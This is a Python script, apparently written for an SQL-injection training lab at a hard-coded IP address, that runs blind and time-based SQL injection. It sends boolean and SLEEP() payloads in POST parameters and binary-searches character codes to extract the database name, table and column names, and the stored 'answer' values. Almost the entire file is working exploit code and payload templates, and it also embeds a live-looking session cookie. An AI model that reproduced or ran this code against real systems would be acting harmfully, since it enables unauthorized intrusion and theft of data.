#!/usr/bin/env python3
from connect import my_request as req
import chardet
import time
import string


def find_key_len(url: str, payload: str,
                 p: str, m_row: str, cook={}) -> int:
    left = -1
    right = 30
    while right > left + 1:
        middle = (left + right) // 2
        param = {p: payload % f'>{middle}'}
        response = req.post_request(url, param, cook)
        time.sleep(3)
        if m_row in response:
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: str,
                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
    result = ''
    for i in range(1, len_of_key + 1):
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1

            # проверка кириллицы
            '''
            param = {p: payload % (i, f'>127')}
            if m_row in req.post_request(url, param, cook):
                print('Кириллица')
            time.sleep(3)
            '''

            param = {p: payload % (i, f'<{middle}')}
            response = req.post_request(url, param, cook)
            time.sleep(3)

            if m_row in response:
                b = middle - 1
            else:
                a = middle
        # end of str
        if a == 32 and b == 32:
            print('end of str')
            break
        print(chr(a), ' kod: ', a)
        result += chr(a)
    return result


def find_binary_cyrr(url: str, payload: str,
                     p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:

    cyrrilic = ' _^абвгдеёжзийклмнопрстуфхчцшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЧЦШЩЫЭЮЯЬЪ'\
        + string.ascii_letters + string.digits
    result = ''

    for i in range(30, 30 + len_of_key + 1):
        for letter in cyrrilic:
            param = {p: payload % (i, f"='{letter}'")}
            response = req.post_request(url, param, cook)
            time.sleep(3)

            if m_row in response:
                result += letter
                print(result, ' letter: ', letter)
                break

    return result


def find_pass_over_bits(url: str, payload: dict, len_of_key: int,
                        check_func, cook={}, unicode_len_bit=8) -> str:
    '''
    text: str of success in response
    unicode_len_bit: len of char in bits, 8 for ascii, 32 for utf-32 etc.
    '''
    result = ''
    num_of_requests = 0
    for j in range(1, len_of_key * 8 // unicode_len_bit + 1):

        bit = ''
        for i in range(1, unicode_len_bit + 1):
            for k, v in sorted(payload.items()):
                param = {k: v % (j, unicode_len_bit, i)}
                response = req.post_request(url, param, cook)
                time.sleep(3)
                num_of_requests += 1
            if check_func(response):
                bit += '1'
            else:
                bit += '0'

        print(bit, hex_str := hex(int(bit, 2))[2:])
        uni_letter = chr(int(bit, 2))
        print(uni_letter, uni_str := bytes.fromhex(hex_str).decode('utf-8'))
        # result += uni_letter
        result += uni_str

    print('num_of_requests:', num_of_requests)
    return result


def find_binary_sleep(url: str, payload: dict, check_func,
                      left: int, right: int,
                      cook={}) -> str:
    '''
    check_func: function for check success in response
    left, right: min and max ascii code of symbol
    text: str of success in response
    letter: number or letter for middle
    '''
    num_of_requests = 0
    payload_tmp = payload.copy()

    while right - left != 0:
        middle = left + (right - left) // 2 + 1
        for k, v in sorted(payload.items()):
            if '%s' in v:
                payload_tmp[k] = v % middle

        t1 = time.time()
        response = req.post_request(url, payload_tmp, cook)
        t2 = time.time()
        num_of_requests += 1

        if check_func(response, t1, t2):
            right = middle - 1
        else:
            left = middle
            time.sleep(3)

    return left, num_of_requests


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return args[2] - args[1] > 3


def main():

    url = "http://178.208.95.16/sql_lab/riddles"
    # url = 'http://localhost/news11.php'
    test_str = 'hearth'
    main_id = 'blind'
    cook = dict(
        session='eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InJkem9ncyJ9.YoY5Dg.JwoyNOEErnKjYW8Gzn2r4ku5R2Q')

    database = 'sql_test'

    #param = dict(blind=f'-1") or IF(ascii(substring((select database()),1,1))=115,sleep(3),false) -- -')
    #response = req.post_request(url, param, cook)

    '''
    time.sleep(3)
    
    if test_str not in response:

        print('base is not sql_test')

        len_of_key = find_key_len(
            url, f"1' and length(database())%s -- -", main_id, test_str, cook)
        print(len_of_key)

        database = find_binary(url, f"1' and ascii(mid((select database()),%s,1))%s -- -",
                               main_id, test_str, 32, 126, len_of_key, cook)
    '''
    print('database: ', database)

    # How many tables we have

    # " -if(ascii(substr((SELECT count(*) TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),1,1))=49,SLEEP(3),0)-- -

    num_table = 1

    len_of_table = 20

    # Name of table
    '''
    len_of_key = 47
    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):

        payload = f'" -if(ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),{i},1))<%s,SLEEP(5),0)-- -'

        param = dict(one=payload)
        left, num_requests = find_binary_sleep(url, param, check_func,
                                               32, 127, cook, method='post', print_resp=False)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)
    print(result)

    exit()
    '''
    table_name = 'riddles'
    print(table_name)

    # Number columns in table
    '''
    payload = f'" -IF(ascii(substr((SELECT count(*) column_name from information_schema.columns WHERE table_name='riddles' AND table_schema=database() limit 0,1),1,1))=50, sleep(3),NULL)-- -'

    '''

    num_columns = 2
    print('num of columns: ', num_columns)

    # Name of colums
    '''
    len_of_key = 47
    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f'" -IF(ascii(substr((SELECT concat(column_name) from information_schema.columns WHERE table_name="riddles" limit 0,1),{i},1))<%s, sleep(4),NULL)-- -'

        param = dict(one=payload)
        left, num_requests = find_binary_sleep(url, param, check_func,
                                               32, 127, cook, method='post', print_resp=False)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)
    print(result)
    '''
    column_name = ['identifier', 'answer']
    print(column_name)

    # Count rows in columns

    # payload = f'" -IF(ascii(substring((select count(*) from riddles limit 0,1),1,1))=49, sleep(3),NULL)-- -'

    # What is in column

    len_of_key = 47
    result = ''
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f'" -IF(ascii(substring((select answer from riddles limit 3,1),{i},1))<%s,sleep(4),0)-- -'

        param = dict(one=payload)
        left, num_requests = find_binary_sleep(url, param, check_func,
                                               32, 127, cook)
        print(chr(left))
        result += chr(left)
        num_of_requests += num_requests

    print('num_of_requests:', num_of_requests)
    print(result)


if __name__ == '__main__':
    main()
